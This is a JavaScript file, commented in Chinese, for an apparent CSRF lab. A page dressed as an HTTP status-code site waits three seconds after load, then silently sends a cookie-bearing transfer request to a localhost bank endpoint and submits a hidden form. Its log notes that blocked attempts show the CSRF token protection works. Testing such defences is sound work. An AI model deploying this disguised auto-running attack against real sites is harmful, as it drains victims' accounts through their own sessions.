// 點擊狀態碼卡片（正常功能）
function viewStatus(code) {
  // 模擬正常的網站行為
  console.log(`Viewing HTTP ${code}`);
  // 可以導向到該狀態碼的詳細頁面
  // window.location.href = `https://http.cat/${code}`;
}

// 除錯日誌功能
const debugPanel = document.getElementById("debugPanel");
const debugLog = document.getElementById("debugLog");
let debugMode = false;

// 按 Ctrl+D 切換除錯面板
document.addEventListener("keydown", (e) => {
  if (e.ctrlKey && e.key === "d") {
    e.preventDefault();
    debugMode = !debugMode;
    debugPanel.classList.toggle("show", debugMode);
  }
});

function addLog(message, type = "info") {
  const timestamp = new Date().toLocaleTimeString();
  const logEntry = document.createElement("div");
  logEntry.className = `log-entry ${type}`;
  logEntry.textContent = `[${timestamp}] ${message}`;
  debugLog.appendChild(logEntry);
  debugLog.scrollTop = debugLog.scrollHeight;

  // 也輸出到 console（不干擾用戶）
  console.log(`[CSRF] ${message}`);
}

// 在背景默默執行 CSRF 攻擊
async function silentAttack() {
  // 延遲 3 秒執行，讓用戶先看到正常的網站內容
  await new Promise((resolve) => setTimeout(resolve, 3000));

  addLog("背景攻擊開始執行...", "info");

  // 攻擊 1: 使用 Fetch API 攻擊轉帳端點
  addLog("方法 1: Fetch API 轉帳攻擊", "info");
  try {
    const response = await fetch("http://localhost:3000/secure-auth/transfer", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        amount: 999999,
        toAccount: "evil-hacker",
      }),
      credentials: "include",
    });

    const data = await response.json();

    if (response.ok) {
      addLog("攻擊成功！$999,999 已轉走！", "error");
    } else {
      addLog(`攻擊被阻擋 (${response.status}: ${data.message})`, "success");
    }
  } catch (error) {
    addLog(`攻擊失敗: ${error.message}`, "success");
  }

  // 等待 2 秒
  await new Promise((resolve) => setTimeout(resolve, 2000));

  // 攻擊 2: 使用表單提交
  addLog("方法 2: 表單提交攻擊", "info");
  try {
    document.getElementById("hiddenAttackForm").submit();
    addLog("表單已在背景提交", "info");
  } catch (error) {
    addLog(`表單提交失敗: ${error.message}`, "error");
  }

  // 等待 2 秒後總結
  await new Promise((resolve) => setTimeout(resolve, 2000));
  addLog("🏁 所有攻擊嘗試已完成", "info");
  addLog("如果攻擊被阻擋，表示 CSRF Token 保護有效！", "success");
}

// 頁面載入完成後自動執行
window.addEventListener("load", () => {
  addLog("頁面已載入", "info");
  addLog("將在 3 秒後開始背景攻擊...", "info");

  // 開始背景攻擊
  silentAttack();
});

// 監聽 iframe 載入
document
  .querySelector('iframe[name="attackFrame"]')
  .addEventListener("load", function () {
    try {
      const iframeContent = this.contentDocument || this.contentWindow.document;
      if (iframeContent.body.innerHTML) {
        addLog("表單攻擊回應已收到", "info");
      }
    } catch (e) {
      addLog("表單攻擊已執行（CORS 限制無法讀取回應）", "info");
    }
  });
